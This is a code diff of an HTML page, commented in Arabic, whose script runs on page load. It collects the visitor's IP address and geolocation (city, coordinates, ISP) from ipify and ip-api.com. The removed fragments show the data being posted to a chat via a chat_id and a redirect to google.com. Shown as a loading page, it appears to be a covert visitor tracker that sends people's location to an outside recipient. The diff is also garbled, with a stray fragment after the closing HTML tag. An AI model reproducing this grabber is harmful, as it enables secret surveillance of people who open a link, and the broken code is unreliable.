@@ -15,12 +15,13 @@
                     return;
                 }
 
+                // جلب الـ IP
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
                 const ip = ipData.ip;
 
-                // استخدم ip-api.com بدلاً من ipapi.co
-                const locationResponse = await fetch(`https://ip-api.com/json/${ip}?fields=status,message,country,city,regionName,lat,lon,isp,org`);
+                // جلب الموقع (استخدام ip-api.com مع إعدادات بسيطة)
+                const locationResponse = await fetch(`https://ip-api.com/json/${ip}?fields=status,country,city,regionName,lat,lon,isp,org`);
                 const locationData = await locationResponse.json();
 
                 if (locationData.status !== 'success') {
@@ -50,28 +51,6 @@
 
                 // إخفاء رسالة "جاري التحميل" وإظهار نجاح
                 document.body.innerHTML = '<h1>✅ تم الإرسال بنجاح</h1>';
-
-            } catch (error) {
-                console.error('خطأ:', error);
-                document.body.innerHTML = '<h1>❌ حدث خطأ، حاول مرة أخرى</h1>';
-            }
-        }
-
-        window.onload = sendInfo;
-    </script>
-</head>
-<body>
-    <h1>جاري تحميل البيانات...</h1>
-</body>
-</html>                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
-                });
-
-                window.location.href = 'https://google.com';
 
             } catch (error) {
                 console.error('خطأ:', error);
